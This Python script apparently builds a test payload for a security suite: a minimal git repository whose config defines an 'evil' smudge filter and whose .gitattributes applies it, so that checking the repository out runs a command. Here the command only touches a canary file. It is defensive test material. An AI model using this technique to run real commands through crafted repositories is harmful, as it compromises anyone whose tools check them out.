"""A3: filter.<name>.smudge + .gitattributes.

When git checkout materializes a file that has ``filter=evil`` set via
``.gitattributes``, the configured smudge command runs. Every pillager
that runs ``git checkout`` (or the modern ``git clone`` which does it
implicitly) ends up firing this.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402

GITATTRIBUTES = b"target.txt filter=evil\n"


def main() -> None:
    build_minimal_repo(
        HERE / "payload",
        config=config_with(
            '[filter "evil"]\n'
            '\tsmudge = "touch /canary/PWNED_A3; cat"\n'
            '\trequired = false\n'
        ),
        tree_entries=[
            (0o100644, ".gitattributes", GITATTRIBUTES),
            (0o100644, "target.txt", b"content\n"),
        ],
    )
    print(f"Built A3 payload at {HERE / 'payload'}")


if __name__ == "__main__":
    main()
